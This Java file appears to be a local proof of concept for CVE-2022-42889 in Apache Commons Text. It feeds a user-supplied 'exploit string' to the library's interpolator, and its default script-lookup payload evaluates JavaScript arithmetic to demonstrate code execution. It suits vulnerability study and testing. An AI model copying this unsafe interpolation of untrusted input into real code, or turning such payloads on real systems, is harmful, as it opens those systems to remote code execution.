package com.seanwrightsec.poc;

import org.apache.commons.text.StringSubstitutor;

import java.util.Scanner;

public class PoC {
    public final static String DEFAULT_POC_STRING = "${script:javascript:195 + 324}";

    public static void main(String[] args) {
        System.out.println("===============================================================================================================================================================================================");
        System.out.println(" .d8888b.  888     888 8888888888       .d8888b.   .d8888b.   .d8888b.   .d8888b.             d8888   .d8888b.   .d8888b.   .d8888b.   .d8888b.       8888888b.");
        System.out.println("d88P  Y88b 888     888 888             d88P  Y88b d88P  Y88b d88P  Y88b d88P  Y88b           d8P888  d88P  Y88b d88P  Y88b d88P  Y88b d88P  Y88b      888   Y88b");
        System.out.println("888    888 888     888 888                    888 888    888        888        888          d8P 888         888 Y88b. d88P Y88b. d88P 888    888      888    888");
        System.out.println("888        Y88b   d88P 8888888              .d88P 888    888      .d88P      .d88P         d8P  888       .d88P  \"Y88888\"   \"Y88888\"  Y88b. d888      888   d88P .d88b.   .d8888b");
        System.out.println("888         Y88b d88P  888              .od888P\"  888    888  .od888P\"   .od888P\"         d88   888   .od888P\"  .d8P\"\"Y8b. .d8P\"\"Y8b.  \"Y888P888      8888888P\" d88\"\"88b d88P\"");
        System.out.println("888    888   Y88o88P   888      888888 d88P\"      888    888 d88P\"      d88P\"      888888 8888888888 d88P\"      888    888 888    888        888      888       888  888 888");
        System.out.println("Y88b  d88P    Y888P    888             888\"       Y88b  d88P 888\"       888\"                    888  888\"       Y88b  d88P Y88b  d88P Y88b  d88P      888       Y88..88P Y88b.");
        System.out.println(" \"Y8888P\"      Y8P     8888888888      888888888   \"Y8888P\"  888888888  888888888               888  888888888   \"Y8888P\"   \"Y8888P\"   \"Y8888P\"       888        \"Y88P\"   \"Y8888P");
        System.out.println("===============================================================================================================================================================================================");
        StringSubstitutor stringSubstitutor = StringSubstitutor.createInterpolator();

        System.out.println("Enter your exploit string (press Enter to use the default of '${script:javascript:195 + 324}'): ");
        Scanner in = new Scanner(System.in);

        String exploitString = in.nextLine();

        if (exploitString.isBlank()) {
            exploitString = DEFAULT_POC_STRING;
        }

        String output = stringSubstitutor.replace(exploitString);

        System.out.println("===============================================================================================================================================================================================");
        System.out.printf("Exploiting PoC with the exploit string '%s'%n", exploitString);
        System.out.println("===============================================================================================================================================================================================");
        System.out.println("PoC Output:");
        System.out.println("-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
        System.out.println(output);
        System.out.println("===============================================================================================================================================================================================");
    }
}